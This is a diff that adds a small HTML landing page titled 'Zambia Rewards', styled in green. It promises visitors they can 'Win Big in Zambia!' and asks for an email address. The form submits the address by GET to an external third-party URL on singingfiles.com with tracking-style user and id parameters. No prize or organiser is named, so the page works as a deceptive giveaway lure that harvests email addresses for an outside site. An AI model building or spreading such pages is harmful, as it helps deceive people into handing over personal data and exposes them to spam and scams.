@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Zambia Rewards</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    background: linear-gradient(to bottom, #f1f8e9, #c5e1a5);
+    text-align: center;
+    padding: 20px;
+    color: #33691e;
+  }
+  .container {
+    max-width: 400px;
+    margin: auto;
+    background: white;
+    padding: 20px;
+    border-radius: 15px;
+    box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+  }
+  h1 {
+    color: #558b2f;
+    margin-bottom: 10px;
+  }
+  p {
+    font-size: 16px;
+    margin-bottom: 20px;
+  }
+  input {
+    width: 90%;
+    padding: 10px;
+    margin: 8px 0;
+    border: 1px solid #ccc;
+    border-radius: 8px;
+  }
+  button {
+    background: #43a047;
+    color: white;
+    padding: 12px;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+    font-size: 16px;
+    width: 95%;
+  }
+  button:hover {
+    background: #2e7d32;
+  }
+</style>
+</head>
+<body>
+  <div class="container">
+    <h1>🎉 Win Big in Zambia!</h1>
+    <p>Enter your Email to join and win amazing rewards!</p>
+    <form action="https://singingfiles.com/show.php?l=0&u=1267627&id=36710" method="get">
+      <input type="email" name="email" placeholder="Enter your Email" required><br>
+      <button type="submit">Join Now</button>
+    </form>
+  </div>
+</body>
+</html>
